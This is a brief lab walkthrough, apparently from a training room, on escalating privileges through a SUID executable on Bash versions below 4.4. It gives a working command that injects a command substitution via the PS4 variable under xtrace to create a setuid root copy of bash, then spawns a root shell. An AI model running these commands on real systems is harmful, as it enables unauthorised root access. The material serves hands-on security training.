SUID / SGID Executables - Abusing Shell Features (#2)
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

rm /tmp/rootbash
exit
